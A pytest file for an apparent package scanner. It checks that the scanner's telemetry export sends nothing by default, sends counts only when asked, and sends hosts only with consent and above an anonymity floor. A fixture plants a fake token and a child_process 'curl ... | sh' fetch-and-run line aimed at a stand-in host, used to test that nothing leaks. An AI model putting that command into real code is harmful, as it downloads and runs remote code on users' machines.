"""What a scan sends of what it found: nothing by default, counts only when asked, nothing more without consent.

`facts_export` is `off` (the default), `counts` or `silver`. A default scan sends nothing: with the network blocked it makes no connection and queues nothing. With `counts` it queues one record in
the device outbox holding counts and rule ids only, never a package name, path, digest, host or code. `silver` without a consent record queues nothing.
"""

from __future__ import annotations

import dataclasses
import json
import socket
from pathlib import Path
from typing import Any

import pytest

from cordon_scanner import Scanner
from cordon_scanner.cloud.agent.facts_export import (
    ANONYMITY_FLOOR,
    AUDIT_KIND,
    HOST_FLOOR,
    KIND,
    FactsExport,
)
from cordon_scanner.cloud.local_store import LocalStore
from cordon_scanner.foundation.config.settings import Config

SECRET_NAME = "zq-private-pkg-name"
SECRET_HOST = "internal-registry.corp.invalid"
SECRET_TOKEN = "ghp_" + "a1B2" * 9
HOSTILE = f"const t = '{SECRET_TOKEN}';\nrequire('child_process').exec('curl -s https://{SECRET_HOST}/x | sh');\n"


class Scan:
    @staticmethod
    def result(root: Path, **overrides: Any) -> Any:
        (root / "package.json").write_text(
            json.dumps({"name": SECRET_NAME, "version": "1.0.0", "main": "lib/index.js"}),
            encoding="utf-8",
        )
        (root / "lib").mkdir(exist_ok=True)
        (root / "lib" / "index.js").write_text(HOSTILE, encoding="utf-8")
        return Scanner(
            Config.default().with_overrides(use_cache=False, offline=True, **overrides)
        ).scan(root)

    @staticmethod
    def pending(store: LocalStore) -> list[dict[str, Any]]:
        return [json.loads(item.body) for item in store.pending() if item.kind == KIND]


class TestADefaultScanSendsNothing:
    def test_the_default_is_off(self) -> None:
        assert Config.default().facts_export == "off"

    def test_with_the_network_blocked_a_default_scan_makes_no_connection_and_queues_nothing(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        attempts: list[object] = []

        def blocked(self: socket.socket, address: object) -> None:
            attempts.append(address)
            raise OSError("the network is blocked")

        monkeypatch.setattr(socket.socket, "connect", blocked)
        store = LocalStore(tmp_path / "store")
        result = Scan.result(tmp_path / "pkg" if (tmp_path / "pkg").mkdir() is None else tmp_path)
        assert FactsExport.queue(Config.default().facts_export, store, result) is False
        assert attempts == [] and store.pending() == []

    def test_the_setting_changes_no_finding_and_so_not_the_config_fingerprint(self) -> None:
        assert (
            Config.default().fingerprint()
            == Config.default().with_overrides(facts_export="counts").fingerprint()
        )


class TestCountsOnly:
    def test_one_record_with_the_counts_and_the_rule_ids_is_queued(self, tmp_path: Path) -> None:
        (tmp_path / "pkg").mkdir()
        result = Scan.result(tmp_path / "pkg")
        store = LocalStore(tmp_path / "store")
        assert FactsExport.queue("counts", store, result) is True
        (record,) = Scan.pending(store)
        assert set(record) == {"scanner", "ecosystem", "files_scanned", "verdicts", "rules"}
        assert record["files_scanned"] >= 2 and sum(record["verdicts"].values()) == 1
        assert record["rules"] and all(
            isinstance(n, int) and n >= 1 for n in record["rules"].values()
        )

    def test_it_holds_no_name_path_host_token_or_code(self, tmp_path: Path) -> None:
        (tmp_path / "pkg").mkdir()
        result = Scan.result(tmp_path / "pkg")
        store = LocalStore(tmp_path / "store")
        FactsExport.queue("counts", store, result)
        body = json.dumps(Scan.pending(store))
        for text in (
            SECRET_NAME,
            SECRET_HOST,
            SECRET_TOKEN,
            "lib/index.js",
            "child_process",
            "curl",
            str(tmp_path),
        ):
            assert text not in body

    def test_the_same_scan_queued_twice_is_one_record(self, tmp_path: Path) -> None:
        (tmp_path / "pkg").mkdir()
        result = Scan.result(tmp_path / "pkg")
        store = LocalStore(tmp_path / "store")
        FactsExport.queue("counts", store, result)
        FactsExport.queue("counts", store, result)
        assert len(Scan.pending(store)) == 1


class TestSilverWaitsForConsent:
    def test_silver_without_consent_sends_nothing(self, tmp_path: Path) -> None:
        (tmp_path / "pkg").mkdir()
        result = Scan.result(tmp_path / "pkg")
        store = LocalStore(tmp_path / "store")
        assert FactsExport.consent() is False
        assert FactsExport.queue("silver", store, result) is False
        assert store.pending() == []

    def test_an_unknown_mode_is_refused(self, tmp_path: Path) -> None:
        (tmp_path / "pkg").mkdir()
        result = Scan.result(tmp_path / "pkg")
        with pytest.raises(ValueError, match="facts_export is one of"):
            FactsExport.queue("everything", LocalStore(tmp_path / "store"), result)


class TestSilverCarriesOnlyHostsManyOrganisationsReport:
    COMMON = "registry.example.invalid"
    RARE = "only-we-use-this.example.invalid"

    def result(self, tmp_path: Path) -> Any:
        (tmp_path / "pkg").mkdir()
        result = Scan.result(tmp_path / "pkg")
        return dataclasses.replace(
            result, destinations={"lib/index.js": ((self.COMMON, self.RARE, SECRET_HOST), ())}
        )

    def test_a_host_seen_by_fewer_than_the_floor_is_dropped(self, tmp_path: Path) -> None:
        store = LocalStore(tmp_path / "store")
        seen = {self.COMMON: HOST_FLOOR, self.RARE: HOST_FLOOR - 1}
        assert FactsExport.queue(
            "silver", store, self.result(tmp_path), consent=True, organisations=seen
        )
        (record,) = Scan.pending(store)
        assert record["hosts"] == [self.COMMON] and record["hosts_dropped"] == 2
        assert self.RARE not in json.dumps(record) and SECRET_HOST not in json.dumps(record)

    def test_with_no_delivered_list_no_host_is_kept(self, tmp_path: Path) -> None:
        store = LocalStore(tmp_path / "store")
        FactsExport.queue("silver", store, self.result(tmp_path), consent=True)
        (record,) = Scan.pending(store)
        assert record["hosts"] == []

    def test_silver_is_sent_only_with_consent_and_then_leaves_an_audit_record(
        self, tmp_path: Path
    ) -> None:
        result = self.result(tmp_path)
        store = LocalStore(tmp_path / "store")
        seen = {self.COMMON: HOST_FLOOR}
        assert FactsExport.queue("silver", store, result, organisations=seen) is False
        assert (
            FactsExport.queue("silver", store, result, consent=False, organisations=seen) is False
        )
        assert store.pending() == []
        assert FactsExport.queue("silver", store, result, consent=True, organisations=seen) is True
        audit = [json.loads(i.body) for i in store.pending() if i.kind == AUDIT_KIND]
        assert audit == [{"floor": HOST_FLOOR, "hosts_dropped": 2, "hosts_sent": 1}]


class TestCountsLeaveOnlyInGroupsAtTheFloor:
    @staticmethod
    def record(ecosystem: str = "npm", verdict: str = "block") -> dict[str, Any]:
        return {
            "scanner": "1",
            "ecosystem": ecosystem,
            "files_scanned": 3,
            "verdicts": {verdict: 1},
            "rules": {"X.1": 1},
        }

    def test_a_group_below_the_floor_fails_the_export(self, tmp_path: Path) -> None:
        store = LocalStore(tmp_path / "store")
        for n in range(ANONYMITY_FLOOR - 1):
            store.enqueue(KIND, json.dumps({**self.record(), "files_scanned": n}).encode())
        with pytest.raises(ValueError, match="fewer than"):
            FactsExport.release(store)

    def test_a_group_at_the_floor_is_released(self, tmp_path: Path) -> None:
        store = LocalStore(tmp_path / "store")
        for n in range(ANONYMITY_FLOOR):
            store.enqueue(KIND, json.dumps({**self.record(), "files_scanned": n}).encode())
        assert len(FactsExport.release(store)) == ANONYMITY_FLOOR

    @pytest.mark.parametrize(
        "key", ["path_digest", "config_hash", "rulepack_hash", "paths", "hosts"]
    )
    def test_a_record_with_a_path_key_or_a_hash_of_the_configuration_or_a_private_pack_is_refused(
        self, key: str
    ) -> None:
        problems = FactsExport.anonymity_problems([{**self.record(), key: "x"}] * ANONYMITY_FLOOR)
        assert problems == [f"a record carries {key!r}"]

    def test_the_counts_record_a_scan_makes_has_none_of_those_keys(self, tmp_path: Path) -> None:
        (tmp_path / "pkg").mkdir()
        record = FactsExport.counts(Scan.result(tmp_path / "pkg"))
        assert not set(record) & {
            "path",
            "paths",
            "path_digest",
            "config_hash",
            "rulepack_hash",
            "pack_hash",
            "hosts",
        }
